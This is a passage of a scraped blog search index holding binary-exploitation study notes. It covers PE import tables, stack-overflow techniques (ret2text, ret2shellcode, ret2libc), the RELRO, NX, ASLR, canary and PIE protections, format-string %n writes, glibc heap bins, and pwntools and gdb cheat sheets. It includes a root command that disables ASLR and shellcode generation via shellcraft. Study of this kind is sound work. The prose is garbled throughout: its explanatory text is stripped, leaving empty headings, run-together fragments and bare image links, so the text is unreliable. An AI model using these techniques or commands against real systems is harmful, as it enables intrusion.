alt=\"image-20210310204717043\"></p>\n<p><strong>2.INT</strong></p>\n<p>INT</p>\n<p></p>\n<p>INTIMAGE_IMPORT_BY_NAME</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204835996.png\" alt=\"image-20210310204835996\"></p>\n<p><strong>3.IMAGE_IMPORT_BY_NAMEIMAGE_IMPORT_BY_NAME</strong></p>\n<p>7A7A&gt;6E7A</p>\n<p>000FOrdinal</p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310205557622.png\" alt=\"image-20210310205557622\"></p>\n<p><strong>4.IAT</strong></p>\n<p>IATNULL</p>\n<p>IAT76344906notepad</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310205918229.png\" alt=\"image-20210310205918229\"></p>\n<p>dllImageBase1000000076344906</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310210426731.png\" alt=\"image-20210310210426731\"></p>\n","categories":[""],"tags":["Book"]},{"title":"PWN","url":"https://pz1o.top/2020/10/24/PWN/","content":"<a id=\"more\"></a>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><p></p>\n<p>PWN,WebPWN</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg\" alt=\"1603543652982\"></p>\n<p></p>\n<p>ppt</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png\" alt=\"image-20201024233545234\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S a.c #</span><br><span class=\"line\">file a.s #  ascii</span><br><span class=\"line\">gcc a.s  #</span><br><span class=\"line\">file a.out #</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png\" alt=\"image-20201027230103100\"></p>\n<h2 id=\"ELF\"><a href=\"#ELF\" class=\"headerlink\" title=\"ELF\"></a>ELF</h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png\" alt=\"image-20201027230424200\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png\" alt=\"image-20201028164523021\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png\" alt=\"image-20201028164758641\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png\" alt=\"image-20201028165455072\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png\" alt=\"image-20201028170244054\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png\" alt=\"image-20201028171316681\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png\" alt=\"image-20201028175015154\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png\" alt=\"image-20201028175324930\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png\" alt=\"image-20201028175515114\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png\" alt=\"image-20201028180055683\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png\" alt=\"image-20201028180509024\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png\" alt=\"image-20201028181509843\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png\" alt=\"image-20201028182158445\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png\" alt=\"image-20201028182509458\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png\" alt=\"image-20201028182719496\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png\" alt=\"image-20201028183231684\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png\" alt=\"image-20201028183244082\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png\" alt=\"image-20201028183715008\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png\" alt=\"image-20201028210304426\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png\" alt=\"image-20201028210843823\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png\" alt=\"image-20201028212002026\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png\" alt=\"image-20201028212037049\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png\" alt=\"image-20201028212448211\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png\" alt=\"image-20201028212603675\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png\" alt=\"image-20201028213307651\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png\" alt=\"image-20201028213458423\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png\" alt=\"image-20201028213648493\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png\" alt=\"image-20201028213849813\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png\" alt=\"image-20201028215303342\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png\" alt=\"image-20201029211445528\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png\" alt=\"image-20201028215837467\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png\" alt=\"image-20201028220533860\"></p>\n<h3 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a>ret2text</h3><p></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png\" alt=\"image-20201029210250310\"></p>\n<h3 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h3><p>shellcode</p>\n<p><strong>shellcode</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png\" alt=\"image-20201103230658840\"></p>\n<p><strong>bssshellcode</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png\" alt=\"image-20201103232118467\"></p>\n<h3 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png\" alt=\"image-20201103231611494\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png\" alt=\"image-20201111165405311\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png\" alt=\"image-20201111170622828\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png\" alt=\"image-20201112200053036\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png\" alt=\"image-20201112201440668\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png\" alt=\"image-20201105154134220\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png\" alt=\"image-20201105160249721\"></p>\n<h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png\" alt=\"image-20201105191117470\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png\" alt=\"image-20201105192140397\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png\" alt=\"image-20201105193656915\"></p>\n<p><strong></strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png\" alt=\"image-20201105200045153\"></p>\n<h2 id=\"x64\"><a href=\"#x64\" class=\"headerlink\" title=\"x64\"></a>x64</h2><p></p>\n<p>6</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png\" alt=\"image-20201115233600880\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png\" alt=\"image-20201116194218608\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png\" alt=\"image-20201106223140061\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png\" alt=\"image-20201106232428225\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png\" alt=\"image-20201106233935531\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"RELRO\"><a href=\"#RELRO\" class=\"headerlink\" title=\"RELRO\"></a>RELRO</h2><p>Relocation Read-Only </p>\n<p>Partial RELRO  Full RELRO RELRO  RELRO</p>\n<p><strong>RELRO</strong>  GCC  RELRORELRO  GOT  bss  GOT<br><strong>RELRO</strong>  GOT </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o a a.c // Partial RELRO</span><br><span class=\"line\">gcc -z norelro -o a a.c // No RELRO</span><br><span class=\"line\">gcc -z lazy -o a a.c // Partial RELRO</span><br><span class=\"line\">gcc -z now -o a a.c // Full RELRO</span><br></pre></td></tr></table></figure>\n<h2 id=\"The-NX-bits\"><a href=\"#The-NX-bits\" class=\"headerlink\" title=\"The NX bits\"></a>The NX bits</h2><p>checksec</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png\" alt=\"image-20201103231211223\"></p>\n<h2 id=\"ASLR\"><a href=\"#ASLR\" class=\"headerlink\" title=\"ASLR\"></a>ASLR</h2><p></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png\" alt=\"image-20201103231430738\"></p>\n<p></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -s <span class=\"built_in\">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>\n<p><strong>ASLR  PIE  ASLR PIE </strong></p>\n<h2 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" title=\"Canary\"></a>Canary</h2><p><strong></strong></p>\n<p>cookie</p>\n<p></p>\n<p><br> GCC </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o a a.c // GCC </span><br><span class=\"line\">gcc -fno-stack-protector -o a a.c //</span><br><span class=\"line\">gcc -fstack-protector -o a a.c // char </span><br><span class=\"line\">gcc -fstack-protector-all -o a a.c //</span><br></pre></td></tr></table></figure>\n<h2 id=\"PIE\"><a href=\"#PIE\" class=\"headerlink\" title=\"PIE\"></a>PIE</h2><p>bss</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o <span class=\"built_in\">test</span> test.c // PIE</span><br><span class=\"line\">gcc -fpie -pie -o <span class=\"built_in\">test</span> test.c // PIE1</span><br><span class=\"line\">gcc -fPIE -pie -o <span class=\"built_in\">test</span> test.c // PIE2</span><br><span class=\"line\">gcc -fpic -o <span class=\"built_in\">test</span> test.c // PIC1PIE</span><br><span class=\"line\">gcc -fPIC -o <span class=\"built_in\">test</span> test.c // PIC2PIE</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>ESP</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png\" alt=\"image-20201117163123759\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png\" alt=\"image-20201117165305864\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png\" alt=\"image-20201117165321403\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><strong>printf </strong></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png\" alt=\"image-20201117203103431\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%x</span><br><span class=\"line\">%p </span><br><span class=\"line\">%s </span><br><span class=\"line\">%n ()</span><br><span class=\"line\">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class=\"line\">printf(&quot;%3$d&quot;,a,b,c) </span><br><span class=\"line\"></span><br><span class=\"line\">printf(&quot;%20c&quot;,c)</span><br><span class=\"line\">printf(&quot;aaa%n&quot;,c)</span><br><span class=\"line\">printf(&quot;%7$n&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">%n 0x00000004</span><br><span class=\"line\">%hn 0x0004</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png\" alt=\"image-20201117213226675\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png\" alt=\"image-20201118152914484\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png\" alt=\"image-20201118173315748\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png\" alt=\"image-20201118223608385\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>,<code>chunk</code></li>\n<li><code>size</code><code>chunk</code><code>free chunk</code></li>\n</ul>\n<h3 id=\"arena\"><a href=\"#arena\" class=\"headerlink\" title=\"arena\"></a><strong>arena</strong></h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png\" alt=\"image-20201118224006678\"></p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a><strong>chunk</strong></h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png\" alt=\"image-20201118230656646\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png\" alt=\"image-20201119110607276\"></p>\n<h4 id=\"malloced-chunk\"><a href=\"#malloced-chunk\" class=\"headerlink\" title=\"malloced chunk\"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png\" alt=\"image-20201118233221511\"></p>\n<p><code>pre size</code>:free chunkchunk<code>pre size</code></p>\n<p><code>size</code>:chunk </p>\n<p><strong>top chunk</strong></p>\n<p>chunk</p>\n<h4 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a><strong>free chunk</strong></h4><p>small bin chunk</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png\" alt=\"image-20201119105945419\"></p>\n<p>large bin chunk</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png\" alt=\"image-20201119110352335\"></p>\n<p>fast bin chunk</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png\" alt=\"image-20201119110501531\"></p>\n<p><strong>pre size </strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png\" alt=\"image-20201119114224011\"></p>\n<h3 id=\"bin\"><a href=\"#bin\" class=\"headerlink\" title=\"bin\"></a><strong>bin</strong></h3><p><code>fastbin</code> &gt;<code>unsorted bin</code>&gt;<code>small bin</code>/<code>large bin</code> </p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png\" alt=\"image-20201119162311702\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png\" alt=\"image-20201119115539452\"></p>\n<h4 id=\"tcache\"><a href=\"#tcache\" class=\"headerlink\" title=\"tcache\"></a>tcache</h4><h4 id=\"fastbins\"><a href=\"#fastbins\" class=\"headerlink\" title=\"fastbins\"></a><strong>fastbins</strong></h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png\" alt=\"image-20201119162151833\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png\" alt=\"image-20201119163702351\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png\" alt=\"image-20201119120748019\"></p>\n<p><strong>bin</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png\" alt=\"1\"></p>\n<h4 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a><strong>unsorted bin</strong></h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png\" alt=\"image-20201119163039733\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png\" alt=\"image-20201119163232880\"></p>\n<h4 id=\"small-bins\"><a href=\"#small-bins\" class=\"headerlink\" title=\"small bins\"></a><strong>small bins</strong></h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png\" alt=\"image-20201119163209378\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png\" alt=\"image-20201119163319068\"></p>\n<h4 id=\"large-bins\"><a href=\"#large-bins\" class=\"headerlink\" title=\"large bins\"></a>large bins</h4><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png\" alt=\"image-20201119163433718\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png\" alt=\"image-20201119163457182\"></p>\n<p><strong></strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png\" alt=\"image-20201119115142092\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png\" alt=\"image-20201119163935171\"></p>\n<p><strong>fastbin</strong></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201121183321818.png\" alt=\"image-20201121183321818\"></p>\n<p><strong>unsorted bin</strong></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"pwntools\"><a href=\"#pwntools\" class=\"headerlink\" title=\"pwntools\"></a>pwntools</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Import pwntools</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#Local communication</span></span><br><span class=\"line\">io = process(<span class=\"string\">\"./a.out\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#Telecommunication</span></span><br><span class=\"line\">io = remote(<span class=\"string\">\"ip\"</span>,port)</span><br><span class=\"line\"><span class=\"comment\">#Receive message</span></span><br><span class=\"line\">io.recvline()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\":\"</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\" : \"</span>,drop = <span class=\"literal\">True</span>)</span><br><span class=\"line\">io.recv()</span><br><span class=\"line\"><span class=\"comment\">#Send message</span></span><br><span class=\"line\">io.sendline(<span class=\"string\">b\"abc\"</span>)</span><br><span class=\"line\">io.send(p32(<span class=\"number\">0</span>)+<span class=\"string\">b\"\\x0a\"</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b\" :\"</span>,str)</span><br><span class=\"line\"><span class=\"comment\">#Interactive</span></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#shellcode</span></span><br><span class=\"line\">shellcraft.sh()  <span class=\"comment\">#in sh environment</span></span><br><span class=\"line\">shellcraft.amd64.sh() <span class=\"comment\">#64 bit</span></span><br><span class=\"line\">asm(shellcraft.sh()) <span class=\"comment\">#machine code</span></span><br><span class=\"line\">asm(shellcraft.sh()).ljust(<span class=\"number\">112</span>,<span class=\"string\">b'a'</span>) <span class=\"comment\">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class=\"line\"><span class=\"comment\">#if you want to attack the 64 bit,pls add it</span></span><br><span class=\"line\">context.arch = <span class=\"string\">\"amd64\"</span></span><br><span class=\"line\"><span class=\"comment\">#find strings</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./filename\"</span>)</span><br><span class=\"line\">hex(next(elf.search(<span class=\"string\">b\"/bin/sh\"</span>)))</span><br><span class=\"line\"><span class=\"comment\">#elf file</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./file\"</span>)</span><br><span class=\"line\">hex(elf.got[<span class=\"string\">\"puts\"</span>])</span><br><span class=\"line\">hex(elf.plt[<span class=\"string\">\"system\"</span>])</span><br><span class=\"line\">hex(elf.symbols[<span class=\"string\">\"buf2\"</span>])</span><br><span class=\"line\"><span class=\"comment\">#flat</span></span><br><span class=\"line\">flat([<span class=\"number\">1</span>,<span class=\"number\">2</span>])</span><br><span class=\"line\"><span class=\"comment\">#generate data</span></span><br><span class=\"line\">cyclic(<span class=\"number\">60</span>)</span><br><span class=\"line\"><span class=\"comment\">#byte data</span></span><br><span class=\"line\">p32(<span class=\"number\">1234</span>)</span><br><span class=\"line\">\\xd2\\x04\\x00\\x00</span><br><span class=\"line\">u32(<span class=\"string\">\"\\xd2\\x04\\x00\\x00\"</span>)</span><br><span class=\"line\"><span class=\"number\">1234</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"gdb\"><a href=\"#gdb\" class=\"headerlink\" title=\"gdb\"></a>gdb</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#start</span></span><br><span class=\"line\">gdb file</span><br><span class=\"line\">start</span><br><span class=\"line\"><span class=\"comment\">#run the executable</span></span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"comment\">#backtrace</span></span><br><span class=\"line\">backtrace</span><br><span class=\"line\"><span class=\"comment\">#return</span></span><br><span class=\"line\"><span class=\"built_in\">return</span></span><br><span class=\"line\"><span class=\"comment\">#breakpoint</span></span><br><span class=\"line\">b main</span><br><span class=\"line\">b <span class=\"keyword\">function</span></span><br><span class=\"line\">b *0x</span><br><span class=\"line\"><span class=\"comment\">#information for breakpoint</span></span><br><span class=\"line\">info b</span><br><span class=\"line\"><span class=\"comment\">#delete the breakpoint</span></span><br><span class=\"line\">d num</span><br><span class=\"line\"><span class=\"comment\">#run</span></span><br><span class=\"line\">r </span><br><span class=\"line\"><span 